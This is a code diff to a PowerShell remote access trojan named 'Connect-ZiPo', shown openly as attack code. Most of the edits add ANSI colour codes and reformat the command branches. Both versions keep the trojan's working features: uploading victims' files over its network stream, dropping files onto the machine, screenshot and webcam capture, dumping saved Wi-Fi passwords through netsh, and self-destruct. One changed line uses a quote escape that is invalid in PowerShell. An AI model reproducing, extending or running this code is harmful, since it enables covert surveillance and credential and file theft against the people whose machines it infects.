@@ -6,16 +6,16 @@ function Connect-ZiPo {
     function Upload-File($path) {
         if (Test-Path $path) {
             $b64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($path))
-            return "[UPLOAD]::$(Split-Path $path -Leaf)::" + $b64 + "::END"
+            return "`e[33m[UPLOAD]::$(Split-Path $path -Leaf)::`e[0m" + $b64 + "`e[33m::END`e[0m"
         } else {
-            return "[ERROR]::FILE NOT FOUND: $path"
+            return "`e[31m[ERROR]::FILE NOT FOUND: $path`e[0m"
         }
     }
 
     function Download-File($filename, $b64) {
         $out = "$env:TEMP\$filename"
         [IO.File]::WriteAllBytes($out, [Convert]::FromBase64String($b64))
-        return "[DOWNLOADED] $out"
+        return "`e[33m[DOWNLOADED] $out`e[0m"
     }
 
     function Take-Screenshot {
@@ -41,7 +41,7 @@ function Connect-ZiPo {
             return Upload-File $file
         }
         catch {
-            return "[ERROR] Webcam not available"
+            return "`e[31m[ERROR] Webcam not available`e[0m"
         }
     }
 
@@ -53,13 +53,13 @@ function Connect-ZiPo {
         $results = ""
         foreach ($profile in $profiles) {
             $results += "[$profile]`n"
-            $results += (netsh wlan show profile name="$profile" key=clear | Select-String "Key Content") + "`n"
+            $results += (netsh wlan show profile name=\"$profile\" key=clear | Select-String "Key Content") + "`n"
         }
         return $results
     }
 
     function Get-BrowserCreds {
-        return "[INFO] Browser creds not implemented — use external extractor."
+        return "`e[34m[INFO] Browser creds not implemented — use external extractor.`e[0m"
     }
 
     function Tree-List {
@@ -85,7 +85,7 @@ function Connect-ZiPo {
             $esc = [char]27
             $clear = "$esc[2J$esc[H"
             $banner = @"
-${esc}[31m
+${esc}[31;1m
    ________ _______  ________  ________
   |\  _____\\  ___ \|\   __  \|\   ____\
   \ \  \__/ \ \   __<\ \  \|\  \ \  \___|
@@ -94,13 +94,13 @@ ${esc}[31m
      \ \__\    \ \_______\ \__\ \__\ \_______\
       \|__|     \|_______|\|__|\|__|\|_______|${esc}[0m
 
-${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
-OS: $([System.Environment]::OSVersion.VersionString)
-Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
-------------------------------------------------------------
+${esc}[32;1m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
+[+] OS: $([System.Environment]::OSVersion.VersionString)
+[+] Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
+${esc}[37m------------------------------------------------------------${esc}[0m
 "@
 
-            $intro = $clear + $banner + "`n${esc}[33mPS $currentDir> ${esc}[0m"
+            $intro = $clear + $banner + "${esc}[90m`nPS $currentDir> ${esc}[0m"
             $bbytes = [Text.Encoding]::UTF8.GetBytes($intro)
             $stream.Write($bbytes, 0, $bbytes.Length)
             $stream.Flush()
@@ -114,14 +114,18 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                     }
                     elseif ($cmd.StartsWith("!get")) {
                         $path = $cmd.Substring(4).Trim()
-                        $response = if ($path) { Upload-File $path } else { "[ERROR] Usage: !get <full_path_to_file>" }
+                        if ([string]::IsNullOrWhiteSpace($path)) {
+                            $response = "`e[31m[ERROR] Usage: !get <full_path_to_file>`e[0m"
+                        } else {
+                            $response = Upload-File $path
+                        }
                     }
                     elseif ($cmd.StartsWith("!post")) {
                         $parts = $cmd.Split("::")
-                        $response = if ($parts.Length -eq 3) {
-                            Download-File $parts[1].Trim() $parts[2].Trim()
+                        if ($parts.Length -eq 3) {
+                            $response = Download-File $parts[1].Trim() $parts[2].Trim()
                         } else {
-                            "[ERROR] INVALID POST FORMAT"
+                            $response = "`e[31m[ERROR] INVALID POST FORMAT`e[0m"
                         }
                     }
                     elseif ($cmd -like "cd *") {
@@ -130,16 +134,28 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                         $currentDir = Get-Location
                         $response = ""
                     }
-                    elseif ($cmd -eq "!sysinfo")      { $response = Get-ComputerInfo | Out-String }
-                    elseif ($cmd -eq "!screenshot")   { $response = Take-Screenshot }
-                    elseif ($cmd -eq "!webcam")       { $response = Capture-Webcam }
-                    elseif ($cmd -eq "!wifi")         { $response = Get-WiFiCreds }
-                    elseif ($cmd -eq "!creds")        { $response = Get-BrowserCreds }
-                    elseif ($cmd -eq "!tree")         { $response = Tree-List }
+                    elseif ($cmd -eq "!sysinfo") {
+                        $response = Get-ComputerInfo | Out-String
+                    }
+                    elseif ($cmd -eq "!screenshot") {
+                        $response = Take-Screenshot
+                    }
+                    elseif ($cmd -eq "!webcam") {
+                        $response = Capture-Webcam
+                    }
+                    elseif ($cmd -eq "!wifi") {
+                        $response = Get-WiFiCreds
+                    }
+                    elseif ($cmd -eq "!creds") {
+                        $response = Get-BrowserCreds
+                    }
+                    elseif ($cmd -eq "!tree") {
+                        $response = Tree-List
+                    }
                     elseif ($cmd -eq "!selfdestruct") {
-                        $response = "[!] Self-destruct initiated..."
-                        $response = "$esc[31m$response$esc[0m"
-                        $stream.Write([Text.Encoding]::UTF8.GetBytes($response), 0, $response.Length)
+                        $response = "`e[91m[!] Self-destruct initiated...`e[0m"
+                        $outBytes = [Text.Encoding]::UTF8.GetBytes($response)
+                        $stream.Write($outBytes, 0, $outBytes.Length)
                         $stream.Flush()
                         Self-Destruct
                     }
@@ -150,17 +166,11 @@ Arch: $env:PROCESSOR_ARCHITECTURE${esc}[0m
                     }
                 }
                 catch {
-                    $response = "[ERROR] $($_.Exception.Message.ToUpper())"
+                    $response = "`e[31m[ERROR] $($_.Exception.Message.ToUpper())`e[0m"
                 }
 
-                # 🎨 Цветовая маркировка
-                $response = $response -replace '(\[ERROR\])', "$esc[31m`$1$esc[0m"
-                $response = $response -replace '(\[!\])', "$esc[31m`$1$esc[0m"
-                $response = $response -replace '(\[\+\])', "$esc[32m`$1$esc[0m"
-                $response = $response -replace '(\[INFO\])', "$esc[36m`$1$esc[0m"
-
                 if (-not $response.EndsWith("`nPS $currentDir> ")) {
-                    $response += "`n${esc}[33mPS $currentDir> ${esc}[0m"
+                    $response += "`n`e[90mPS $currentDir> `e[0m"
                 }
 
                 $outBytes = [Text.Encoding]::UTF8.GetBytes($response)
